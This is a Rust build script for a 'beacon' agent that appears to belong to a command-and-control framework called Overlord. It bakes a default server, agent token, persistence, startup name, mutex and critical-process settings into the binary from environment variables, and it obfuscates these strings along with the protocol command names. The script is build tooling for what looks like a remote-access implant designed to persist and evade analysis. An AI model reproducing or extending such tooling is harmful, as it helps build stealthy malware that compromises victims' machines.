use std::{env, fs, path::PathBuf};

use serde_json::Value;

const ENV_DEFAULTS: [(&str, &str); 10] = [
    ("built_default_server", "OVERLORD_BEACON_DEFAULT_SERVER"),
    (
        "built_default_agent_token",
        "OVERLORD_BEACON_DEFAULT_AGENT_TOKEN",
    ),
    ("built_default_build_tag", "OVERLORD_BEACON_DEFAULT_BUILD_TAG"),
    (
        "built_default_tls_spki_pins",
        "OVERLORD_BEACON_DEFAULT_TLS_SPKI_PINS",
    ),
    ("built_default_mutex", "OVERLORD_BEACON_DEFAULT_MUTEX"),
    (
        "built_default_persistence",
        "OVERLORD_BEACON_DEFAULT_PERSISTENCE",
    ),
    (
        "built_default_startup_name",
        "OVERLORD_BEACON_DEFAULT_STARTUP_NAME",
    ),
    (
        "built_default_sleep_seconds",
        "OVERLORD_BEACON_DEFAULT_SLEEP_SECONDS",
    ),
    (
        "built_default_critical_process",
        "OVERLORD_BEACON_DEFAULT_CRITICAL_PROCESS",
    ),
    (
        "built_default_output_name",
        "OVERLORD_BEACON_DEFAULT_OUTPUT_NAME",
    ),
];

fn main() {
    for (_, name) in ENV_DEFAULTS {
        println!("cargo:rerun-if-env-changed={name}");
    }
    let contract_path = [
        "../protocol/wire-contract.json",
        "protocol/wire-contract.json",
        "../../protocol/wire-contract.json",
    ]
    .into_iter()
    .map(PathBuf::from)
    .find(|path| path.exists())
    .expect("protocol/wire-contract.json is missing from the build tree");
    println!("cargo:rerun-if-changed={}", contract_path.display());
    let contract: Value = serde_json::from_slice(
        &fs::read(&contract_path).expect("read protocol/wire-contract.json"),
    )
    .expect("parse protocol/wire-contract.json");

    let protocol_version = contract["protocolVersion"]
        .as_u64()
        .expect("wire contract protocolVersion");
    let mut generated = format!("pub const WIRE_PROTOCOL_VERSION: u16 = {protocol_version};\n");

    for (name, env_name) in ENV_DEFAULTS {
        let value = env::var(env_name).unwrap_or_default();
        generated.push_str(&format!(
            "pub fn {name}() -> String {{ crate::obfstr!({value:?}) }}\n"
        ));
    }

    let commands = contract["commands"]
        .as_array()
        .expect("wire contract commands");
    let default_version = contract["commandVersioning"]["defaultVersion"]
        .as_u64()
        .expect("wire contract default command version");
    let overrides = contract["commandVersioning"]["overrides"]
        .as_object()
        .cloned()
        .unwrap_or_default();

    generated.push_str("pub fn command_version_support() -> Vec<(String, u16, u16)> {\n    vec![\n");
    for command in commands {
        let name = command.as_str().expect("command name");
        if let Some(rule) = overrides.get(name) {
            let max = rule["latestVersion"].as_u64().unwrap_or(default_version);
            let min = rule["minVersion"].as_u64().unwrap_or(1);
            generated.push_str(&format!(
                "        (crate::obfstr!({name:?}), {min}, {max}),\n"
            ));
        } else {
            generated.push_str(&format!(
                "        (crate::obfstr!({name:?}), {default_version}, {default_version}),\n"
            ));
        }
    }
    generated.push_str("    ]\n}\n");

    let output = PathBuf::from(env::var_os("OUT_DIR").expect("OUT_DIR")).join("wire_contract.rs");
    fs::write(output, generated).expect("write generated beacon wire constants");
}
